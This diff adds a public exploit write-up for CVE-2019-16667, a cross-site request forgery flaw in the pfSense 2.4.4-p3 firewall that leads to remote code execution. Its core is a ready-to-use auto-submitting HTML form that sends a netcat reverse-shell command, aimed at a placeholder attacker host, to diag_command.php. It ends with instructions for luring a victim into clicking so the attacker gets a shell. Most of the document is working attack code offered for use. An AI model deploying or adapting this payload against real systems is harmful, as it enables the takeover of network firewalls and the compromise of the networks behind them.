@@ -1,0 +1,40 @@
+# Exploit Title: pfSense 2.4.4-p3 - Cross-Site Request Forgery
+# Date: 2019-09-27
+# Exploit Author: ghost_fh
+# Vendor Homepage: https://www.pfsense.org/
+# Software Link: https://www.pfsense.org/download/index.html?section=downloads
+# Version: Till 2.4.4-p3
+# Tested on: freebsd
+# CVE : CVE-2019-16667
+
+# Vulnerability Description :- The pfsense firewall is vulnerable to RCE
+# chained with CSRF as it uses `csrf magic` library since it allows to tamper
+# the CSRF token values submitted when processing the form requests. Due to
+# this flaw, an attacker can exploit this vulnerability by crafting new page
+# that contains attacker's controlled input such as a "reverse shell" (eg:
+# `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attackerip port
+# >/tmp/f`token value) in the form and entice the victims to click
+# on the crafted link via social engineering methods. Once the victim clicks
+# on the link (try again button in this case), the attacker can take the
+# lateral control of the victim's machine and malicious actions can be
+# performed on the victim's behalf.
+
+<!DOCTYPE html>
+<html>
+<body onload="document.createElement('form').submit.call(document.getElementById('myForm'))">
+<form id="myForm" action="https://pfsense_ip/diag_command.php" method="POST">
+<input type=hidden name="txtCommand" value="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|
+nc attacker_ip attacker_port >/tmp/f">
+<input type=hidden name="txtRecallBuffer" value="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i
+2>&1|nc attacker_ip attacker_port >/tmp/f">
+<input type=hidden name="dlPath" value="">
+<input type=hidden name="txtPHPCommand" value="">
+<input type="hidden" name="submit" value="EXEC">
+</form>
+</body>
+</html>
+
+# Create a malicious page containing the above values and once user clicks on malicious link, 
+# he will be redirected to https://pfsense_ip/diag_command.php page.
+# Victim will be greeted with the "Try again" button.
+# Once victim clicks on the "Try again" button you will be greeted with reverse shell of the victim.
